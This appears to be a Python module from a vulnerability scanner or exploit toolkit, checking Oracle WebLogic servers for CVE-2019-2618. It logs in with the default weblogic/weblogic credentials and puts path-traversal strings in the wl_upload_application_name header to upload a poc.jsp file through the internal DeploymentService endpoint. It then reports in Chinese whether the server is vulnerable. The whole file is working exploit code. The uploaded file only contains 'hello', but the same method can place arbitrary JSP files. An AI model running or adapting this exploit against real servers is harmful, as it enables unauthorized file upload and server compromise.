import requests
import time
from bs4 import BeautifulSoup
import logging
import re

uj=''
http = ''
https = ''
def a2dl13(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global uj
    global http,https
    try:
        proxies = {'http': http,
                   'https': https}
        filename = 'poc.jsp'
        data = f'''
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="{filename}"; filename="{filename}"
        Content-Type: false

        hello

        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
        '''
        headers = {'username': 'weblogic',
                   'password': 'weblogic',
                   'wl_request_type': 'app_upload',
                   'wl_upload_application_name': '\\\\..\\\\tmp\\\\_WL_internal\\\\bea_wls_internal\\\\9j4dqk\\\\war',
                   'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW'}
        logging.captureWarnings(True)
        aa = requests.post(url1+'bea_wls_deployment_internal/DeploymentService',data=data,headers=headers,cookies=s_cookie,proxies=proxies,verify=False, timeout=5)
        logging.captureWarnings(True)
        headers['wl_upload_application_name'] = '/../tmp/_WL_internal/bea_wls_internal/9j4dqk/war'
        aa1 = requests.post(url1+'bea_wls_deployment_internal/DeploymentService',data=data,headers=headers,cookies=s_cookie,proxies=proxies,verify=False, timeout=5)
        if (aa != None and aa.status_code != 404) or (aa1 != None and aa1.status_code != 404):
            if 'Invalid user name or password.' not in aa.text or 'Invalid user name or password.' not in aa1.text:
                uj='[+]漏洞存在\n'+aa1.text
            else:
                uj = '[-]漏洞不存在\n'
        else:
            uj='[-]漏洞不存在\n'
    except EnvironmentError as aaa:
        uj='[-]请求错误\n'+str(aaa)
def a2jg83():
    global uj
    return '--------------------------------------------------\n[ Weblogic(CVE_2019_2618) ]\n\n'+ str (uj)+'\n'
def a2u83(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)
